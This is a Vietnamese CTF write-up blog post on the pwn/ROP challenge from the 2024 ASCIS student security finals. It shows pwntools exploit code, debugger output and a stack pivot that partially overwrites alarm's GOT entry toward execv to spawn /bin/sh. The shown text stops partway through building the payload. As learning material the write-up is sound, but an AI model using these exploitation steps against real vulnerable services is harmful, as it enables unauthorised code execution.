<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="noodp">
<title>Sinh viên với An toàn Thông tin 2024 - ducdatdau</title><meta name=Description content="just a street kid with a solid academic background"><meta property="og:title" content="Sinh viên với An toàn Thông tin 2024">
<meta property="og:description" content="Sinh viên với An toàn Thông tin là cuộc thi CTF danh giá nhất cho sinh viên ở Việt Nam. Hằng năm, cuộc thi được tổ chức 3 vòng: khởi động, sơ khảo và chung khảo. Dưới đây là bài giải cho một số challenge pwnable và reversing ở các vòng thi của mình.
Theo ý kiến cá nhân, các bài reversing thường khá khó và tốn nhiều công sức để phân tích nhưng rất thú vị. Ngược lại, các bài pwnable thì không quá mới lạ khi chỉ xoay quanh các bug cơ bản như Buffer Overflow, Format String Bug hay Use After Free, &mldr;">
<meta property="og:type" content="article">
<meta property="og:url" content="https://ducdatdau.github.io/2024-finalascis/"><meta property="og:image" content="https://ducdatdau.github.io/logo.png"><meta property="article:section" content="ctf-writeup">
<meta property="article:published_time" content="2024-10-19T00:00:00+00:00">
<meta property="article:modified_time" content="2024-10-19T00:00:00+00:00"><meta property="og:site_name" content="ducdatdau blog">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://ducdatdau.github.io/logo.png">
<meta name=twitter:title content="Sinh viên với An toàn Thông tin 2024">
<meta name=twitter:description content="Sinh viên với An toàn Thông tin là cuộc thi CTF danh giá nhất cho sinh viên ở Việt Nam. Hằng năm, cuộc thi được tổ chức 3 vòng: khởi động, sơ khảo và chung khảo. Dưới đây là bài giải cho một số challenge pwnable và reversing ở các vòng thi của mình.
Theo ý kiến cá nhân, các bài reversing thường khá khó và tốn nhiều công sức để phân tích nhưng rất thú vị. Ngược lại, các bài pwnable thì không quá mới lạ khi chỉ xoay quanh các bug cơ bản như Buffer Overflow, Format String Bug hay Use After Free, &mldr;">
<meta name=application-name content="Blogs">
<meta name=apple-mobile-web-app-title content="Blogs"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://github.com/ducdatdau.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://ducdatdau.github.io/2024-finalascis/><link rel=prev href=https://ducdatdau.github.io/2024-kcsc-recruitment/><link rel=next href=https://ducdatdau.github.io/2024-isitdtu-quals/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'">
<noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'">
<noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Sinh viên với An toàn Thông tin 2024","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/ducdatdau.github.io\/2024-finalascis\/"},"genre":"posts","keywords":"Reverse-Engineering, Pwnable, ASCIS, 2024","wordcount":1549,"url":"https:\/\/ducdatdau.github.io\/2024-finalascis\/","datePublished":"2024-10-19T00:00:00+00:00","dateModified":"2024-10-19T00:00:00+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"ducdatdau"},"description":""}</script></head>
<body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=ducdatdau>Home</a>
</div>
<div class=menu>
<div class=menu-inner><a class=menu-item href=/misc-notes/ title="Misc Notes"> Misc Notes </a><a class=menu-item href=/research/ title=Research> Security Research </a><a class=menu-item href=/ctf-writeup/ title="CTF Writeup"> CTF </a><a class=menu-item href=/list100/ title="List 100"> List 100 </a><a class=menu-item href=/tags/> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search>
<i class="fas fa-search fa-fw" aria-hidden=true></i>
</a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear>
<i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a>
<span class="search-button search-loading" id=search-loading-desktop>
<i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i>
</span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a></div>
</div>
</div>
</header><header class=mobile id=header-mobile>
<div class=header-container>
<div class=header-wrapper>
<div class=header-title>
<a href=/ title=ducdatdau>Home</a>
</div>
<div class=menu-toggle id=menu-toggle-mobile>
<span></span><span></span><span></span>
</div>
</div>
<div class=menu id=menu-mobile><div class=search-wrapper>
<div class="search mobile" id=search-mobile>
<input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search>
<i class="fas fa-search fa-fw" aria-hidden=true></i>
</a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear>
<i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a>
<span class="search-button search-loading" id=search-loading-mobile>
<i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i>
</span>
</div>
<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
Cancel
</a>
</div><a class=menu-item href=/misc-notes/ title="Misc Notes">Misc Notes</a><a class=menu-item href=/research/ title=Research>Security Research</a><a class=menu-item href=/ctf-writeup/ title="CTF Writeup">CTF</a><a class=menu-item href=/list100/ title="List 100">List 100</a><a class=menu-item href=/tags/ title>Tags</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a></div>
</div>
</header><div class="search-dropdown desktop">
<div id=search-dropdown-desktop></div>
</div>
<div class="search-dropdown mobile">
<div id=search-dropdown-mobile></div>
</div><main class=main>
<div class=container><div class=toc id=toc-auto>
<h2 class=toc-title>Contents</h2>
<div class=toc-content id=toc-content-auto></div>
</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Sinh viên với An toàn Thông tin 2024</h1><div class=post-meta>
<div class=post-meta-line><span class=post-author><a href=https://ducdatdau.github.io/ title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>ducdatdau</a></span></div>
<div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2024-10-19>2024-10-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1549 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;8 minutes&nbsp;</div><div class=post-meta-line>
<span class=post-tags-inline style="display:inline-flex;gap:.375rem;flex-wrap:wrap;margin:.5rem 0;font-weight:500"><a class="tag-badge tag-reverse" href=/tags/reverse-engineering/ title=Reverse-Engineering><span class=tag-icon aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-1 h-4 w-4"><path d="M19.439 7.85c-.049.322.059.648.289.878l1.568 1.568c.47.47.706 1.087.706 1.704s-.235 1.233-.706 1.704l-1.611 1.611a.98.98.0 01-.837.276c-.47-.07-.802-.48-.968-.925a2.501 2.501.0 10-3.214 3.214c.446.166.855.497.925.968a.979.979.0 01-.276.837l-1.61 1.61A2.404 2.404.0 0112 22.002a2.402 2.402.0 01-1.704-.706l-1.568-1.568a1.026 1.026.0 00-.877-.29c-.493.074-.84.504-1.02.968a2.5 2.5.0 11-3.237-3.237c.464-.18.894-.527.967-1.02a1.026 1.026.0 00-.289-.877l-1.568-1.568A2.402 2.402.0 011.998 12c0-.617.236-1.234.706-1.704L4.23 8.77c.24-.24.581-.353.917-.303.515.077.877.528 1.073 1.01a2.5 2.5.0 103.259-3.259c-.482-.196-.933-.558-1.01-1.073-.05-.336.062-.676.303-.917l1.525-1.525A2.402 2.402.0 0112 1.998c.617.0 1.234.236 1.704.706l1.568 1.568c.23.23.556.338.877.29.493-.074.84-.504 1.02-.968a2.5 2.5.0 113.237 3.237c-.464.18-.894.527-.967 1.02z"/></svg></span><span class=tag-text>Reverse-Engineering</span></a>
<a class="tag-badge tag-pwn" href=/tags/pwnable/ title=Pwnable><span class=tag-icon aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m14 13-7.5 7.5c-.83.83-2.17.83-3 0a2.12 2.12.0 010-3L11 10"/><path d="m16 16 6-6"/><path d="m8 8 6-6"/><path d="m9 7 8 8"/><path d="m21 11-8-8"/></svg></span><span class=tag-text>Pwnable</span></a>
<a class="tag-badge tag-default" href=/tags/ascis/ title=ASCIS><span class=tag-icon aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-1 h-4 w-4"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
</span><span class=tag-text>ASCIS</span></a>
<a class="tag-badge tag-default tag-year" href=/tags/2024/ title=2024><span class=tag-text>2024</span></a>
</span>
</div></div><div class="details toc" id=toc-static data-kept>
<div class="details-summary toc-title">
<span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span>
</div>
<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
<ul>
<li><a href=#pwnrop>pwn/ROP</a>
<ul>
<li><a href=#0x00-overview>0x00. Overview</a></li>
<li><a href=#0x01-stack-pivot>0x01. Stack Pivot</a></li>
<li><a href=#0x02-build-payload>0x02. Build payload</a></li>
</ul>
</li>
<li><a href=#revtrust-me>rev/Trust Me!</a></li>
</ul>
</nav></div>
</div><div class=content id=content><p>Sinh viên với An toàn Thông tin là cuộc thi CTF danh giá nhất cho sinh viên ở Việt Nam. Hằng năm, cuộc thi được tổ chức 3 vòng: khởi động, sơ khảo và chung khảo. Dưới đây là bài giải cho một số challenge pwnable và reversing ở các vòng thi của mình.</p>
<p>Theo ý kiến cá nhân, các bài reversing thường khá khó và tốn nhiều công sức để phân tích nhưng rất thú vị. Ngược lại, các bài pwnable thì không quá mới lạ khi chỉ xoay quanh các bug cơ bản như Buffer Overflow, Format String Bug hay Use After Free, &mldr;</p>
<style>img{box-shadow:rgba(0,0,0,.35)0 5px 15px;border-radius:6px;display:block;margin:0 auto 15px}</style>
<h2 id=pwnrop>pwn/ROP</h2>
<img src=./imgs/0.png width=500px/>
<div class="details admonition note open">
<div class="details-summary admonition-title">
<i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Information<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i>
</div>
<div class=details-content>
<div class=admonition-content><ul>
<li><strong>Given files:</strong> <a href="https://drive.google.com/file/d/1oKm_Ph4fC4LRWtJW0weBosRvdQy1yFY6/view?usp=sharing" target=_blank rel="noopener noreffer">ROP.zip</a></li>
</ul>
</div>
</div>
</div>
<h3 id=0x00-overview>0x00. Overview</h3>
<p>Kiểm tra thông tin của binary và các lớp bảo vệ.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>➜  pwn-ROP file chall
chall: ELF 64-bit LSB executable, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter ./ld-linux-x86-64.so.2, <span class=k>for</span> GNU/Linux 3.2.0, BuildID<span class=o>[</span>sha1<span class=o>]=</span>408b0fc1dee8dad901b33ff68c1e8179fef5bc89, not stripped

gef➤  checksec
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
</code></pre></td></tr></table>
</div>
</div><p>Đề bài cho một binary 64 bit, đã tắt canary và có thể ghi được GOT (Global Offset Table).</p>
<p>Bên cạnh đó, đề bài còn cung cấp Dockerfile, mình sẽ build docker để lấy libc, ld trong docker trước. Ý tưởng đầu tiên của mình là sử dụng kỹ thuật <strong>ret2libc</strong>.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>➜  pwn-ROP docker build . -t rop
➜  pwn-ROP docker run -p 5000:5000 --privileged -it rop
➜  pwn-ROP docker cp ee13afb344e4:/srv/usr/lib/x86_64-linux-gnu/libc.so.6 .
➜  pwn-ROP docker cp ee13afb344e4:/srv/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .
</code></pre></td></tr></table>
</div>
</div><br>
<p>Dễ dàng thấy có bug Buffer Overflow trong hàm <code>vuln()</code>. Đặc biệt hơn khi không có bất cứ hàm nào in ra được output ngoài màn hình. Vì vậy kỹ thuật <strong>ret2libc</strong> nêu trên không thể sử dụng được. Kết hợp với việc GOT ghi đè được, mình có thể dùng kỹ thuật <strong>ret2dlresolve</strong> để giải hoặc stack pivot nhằm overwrite bảng GOT của <code>alarm()</code> thành <code>execv()</code>.</p>
<div class="details admonition note open">
<div class="details-summary admonition-title">
<i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i>
</div>
<div class=details-content>
<div class=admonition-content><p>Tại sao sử dụng <code>execv()</code> mà không phải <code>execve()</code> như thông thường?</p>
<p>Do <code>execv()</code> yêu cầu tới tận 3 tham số, trong khi đó mình không thấy bất cứ gadget nào có thể thay đổi được giá trị thanh ghi <code>rdx</code>. Vì vậy mình đã sử dụng <code>execv()</code> với yêu cầu là 2 tham số và các giá trị <code>rdi</code>, <code>rsi</code> hoàn toàn kiểm soát được.</p>
</div>
</div>
</div>
<img src=./imgs/1.png>
<h3 id=0x01-stack-pivot>0x01. Stack Pivot</h3>
<p>Stack Pivot là một kỹ thuật đưa địa chỉ stack từ một số ngẫu nhiên do cơ chế <a href=https://en.wikipedia.org/wiki/Address_space_layout_randomization target=_blank rel="noopener noreffer">ASLR</a> thành địa chỉ tĩnh của binary nhằm thuận tiện cho việc xây dựng các ROP chain.</p>
<p>Để sử dụng kỹ thuật này, đoạn assembly code thường được sử dụng là</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>leave
retn
</code></pre></td></tr></table>
</div>
</div><p>Đây chính là đoạn code mình sử dụng để thực thi stack pivot có địa chỉ <strong>0x401249</strong>.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>.text:0000000000401249 lea     rax, [rbp+buf]
.text:000000000040124D mov     edx, 48h ; &#39;H&#39;  ; nbytes
.text:0000000000401252 mov     rsi, rax        ; buf
.text:0000000000401255 mov     edi, 0          ; fd
.text:000000000040125A call    _read
.text:000000000040125F nop
.text:0000000000401260 leave
.text:0000000000401261 retn
</code></pre></td></tr></table>
</div>
</div><p>Nếu đoạn code trên được gọi, mình sẽ làm được:</p>
<ul>
<li>Ghi được dữ liệu vào <code>rbp - 0x20</code></li>
<li>New RBP = [RBP]</li>
<li>New RIP = [RBP + 8]</li>
</ul>
<br>
<p>Trước tiên, cần phải tính toán offset để ghi đè Saved RIP. Mảng <code>buf</code> nằm ở <code>[rbp - 0x20]</code> → ta cần 32 bytes để ghi đè nó. Mình sẽ thử viết 1 POC để trigger lỗi xem new RBP và new RIP sẽ có giá trị như nào.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>import</span> <span class=nn>time</span>

<span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./chall_patched&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<span class=n>ld</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ld-linux-x86-64.so.2&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>

<span class=n>context</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;cmd.exe /c start wsl&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(),</span> <span class=n>binary</span><span class=o>=</span><span class=n>exe</span><span class=p>)</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>   

<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
    <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>,</span> 
    <span class=mh>0xdeedbeef</span><span class=p>,</span>         <span class=c1># New RBP </span>
    <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mi>8</span>            <span class=c1># New RIP </span>
<span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>Kết quả thu được như mình mong muốn, new RBP = 0xdeedbeef và new RIP = BBBBBBBB</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=nv>$rax</span>   : 0x30
<span class=nv>$rbx</span>   : 0x0
<span class=nv>$rcx</span>   : 0x00001555553fd7e2  →  0x5677fffff0003d48 <span class=o>(</span><span class=s2>&#34;H=&#34;</span>?<span class=o>)</span>
<span class=nv>$rdx</span>   : 0x48
<span class=nv>$rsp</span>   : 0x00007fffffffdfe8  →  0x4242424242424242 <span class=o>(</span><span class=s2>&#34;BBBBBBBB&#34;</span>?<span class=o>)</span>
<span class=nv>$rbp</span>   : 0xdeedbeef
<span class=nv>$rsi</span>   : 0x00007fffffffdfc0  →  0x4141414141414141 <span class=o>(</span><span class=s2>&#34;AAAAAAAA&#34;</span>?<span class=o>)</span>
<span class=nv>$rdi</span>   : 0x0
<span class=nv>$rip</span>   : 0x0000000000401261  →  &lt;vuln+002d&gt; ret
<span class=nv>$r8</span>    : 0x00007fffffffdf30  →  0x0000000000000000
<span class=nv>$r9</span>    : 0x0
<span class=nv>$r10</span>   : 0x00001555552ef5e8  →  0x000f001200001a64
<span class=nv>$r11</span>   : 0x246
<span class=nv>$r12</span>   : 0x00007fffffffe108  →  0x00007fffffffe37e  →  <span class=s2>&#34;/home/ducdatdau/ctfs/2024/ascis_final/pwn-ROP/chal[...]&#34;</span>
<span class=nv>$r13</span>   : 0x0000000000401262  →  &lt;main+0000&gt; endbr64
<span class=nv>$r14</span>   : 0x0000000000403e18  →  0x0000000000401180  →  &lt;__do_global_dtors_aux+0000&gt; endbr64
<span class=nv>$r15</span>   : 0x0000155555554040  →  0x00001555555552e0  →  0x0000000000000000
<span class=nv>$eflags</span>: <span class=o>[</span>zero CARRY PARITY adjust sign <span class=nb>trap</span> INTERRUPT direction overflow resume virtualx86 identification<span class=o>]</span>
<span class=nv>$cs</span>: 0x33 <span class=nv>$ss</span>: 0x2b <span class=nv>$ds</span>: 0x00 <span class=nv>$es</span>: 0x00 <span class=nv>$fs</span>: 0x00 <span class=nv>$gs</span>: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfe8│+0x0000: 0x4242424242424242   ← <span class=nv>$rsp</span>
0x00007fffffffdff0│+0x0008: 0x0000000000000001
0x00007fffffffdff8│+0x0010: 0x0000155555312d90  →  0xe80001b859e8c789
0x00007fffffffe000│+0x0018: 0x0000000000000000
0x00007fffffffe008│+0x0020: 0x0000000000401262  →  &lt;main+0000&gt; endbr64
0x00007fffffffe010│+0x0028: 0x00000001ffffe0f0
0x00007fffffffe018│+0x0030: 0x00007fffffffe108  →  0x00007fffffffe37e  →  <span class=s2>&#34;/home/ducdatdau/ctfs/2024/ascis_final/pwn-ROP/chal[...]&#34;</span>
0x00007fffffffe020│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40125a &lt;vuln+0026&gt;      call   0x4010a0 &lt;read@plt&gt;
     0x40125f &lt;vuln+002b&gt;      nop
     0x401260 &lt;vuln+002c&gt;      leave
●→   0x401261 &lt;vuln+002d&gt;      ret
<span class=o>[</span>!<span class=o>]</span> Cannot disassemble from <span class=nv>$PC</span>
───────────────────────────────────────────────────────────────────────────────────────────────── threads ────
<span class=o>[</span><span class=c1>#0] Id 1, Name: &#34;chall_patched&#34;, stopped 0x401261 in vuln (), reason: BREAKPOINT</span>
─────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
<span class=o>[</span><span class=c1>#0] 0x401261 → vuln()</span>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></td></tr></table>
</div>
</div><h3 id=0x02-build-payload>0x02. Build payload</h3>
<p>Các công việc mình cần phải xử lý bây giờ là:</p>
<ol>
<li>Overwrite 2 bytes cuối cùng của GOT <code>alarm()</code> thành <code>execv()</code>. <br>
Do cùng phiên bản libc nên 12 bits cuối của các hàm libc luôn giữ nguyên. Ví dụ alarm = 0x1555553d3540 thì <code>540</code> luôn được giữ nguyên, overwrite 2 bytes cuối làm thay đổi giá trị <code>3</code>. Lúc này sẽ cần bruteforce để tìm chính xác địa chỉ, xác suất thành công là <strong>1/16 = 6.25%</strong>.</li>
<li>Ghi chuỗi <code>/bin/sh\x00</code> lên bộ nhớ.</li>
<li>[RSI] = 0, trong đó RSI là một địa chỉ hợp lệ.</li>
</ol>
<p><strong>1. Overwrite 2 bytes GOT <code>alarm()</code></strong></p>
<p>Để overwrite, RBP - 0x20 = 0x404020 → RBP = 0x404040.</p>
<img src=./imgs/3.png>
<p>Sau khi ghi được 2 bytes cuối, [RBP] = [0x404040] = 0, dẫn tới việc không thể tiếp tục ghi được các giá trị khác vào bộ nhớ nữa.</p>
<p>Mình xây dựng lại cấu trúc bộ nhớ như sau, trong đó [0x404040] tiếp tục được trỏ tới 1 vùng nhớ không có dữ liệu ở phía dưới để phục vụ cho công việc [RSI] = 0, đồng thời 12 bits cuối cùng của <code>alarm@got</code> cũng bị overwrite.</p>
<img src=./imgs/2.png>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x401247</span>
<span class=n>pop_rbp</span> <span class=o>=</span> <span class=mh>0x40119d</span>
<span class=n>ret</span> <span class=o>=</span> <span class=mh>0x40101a</span>
<span class=n>alarm_got</span> <span class=o>=</span> <span class=mh>0x404020</span>

<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
    <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>,</span> 
    <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0x40</span><span class=p>,</span> 
    <span class=mh>0x401249</span>
<span class=p>)</span>

<span class=nb>input</span><span class=p>(</span><span class=s1>&#39;input 1: stack pivot&#39;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
    <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>,</span> 
    <span class=mh>0x401249</span><span class=p>,</span>
    <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x10</span><span class=p>,</span>
    <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>,</span> 
    <span class=mh>0x401249</span>
<span class=p>)</span>

<span class=nb>input</span><span class=p>(</span><span class=s1>&#39;input 2: stack pivot new area&#39;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=nb>input</span><span class=p>(</span><span class=s1>&#39;input 3: change 2 bytes&#39;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xc0\x41</span><span class=s1>&#39;</span><span class=p>)</span>

</code></pre></td></tr></table>
</div>
</div><p>Kết quả thu được như mình mong muốn, 2 bytes cuối của <code>alarm@got</code> bị ghi thành <code>/x41/xc0</code>, RBP = 0x404120.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>gef➤  x/gx 0x404020
0x404020 &lt;alarm@got.plt&gt;:       0x00001555553d41c0
gef➤  x/gx <span class=nv>$rbp</span>
0x404120:       0x0000000000000000
</code></pre></td></tr></table>
</div>
</div><br>
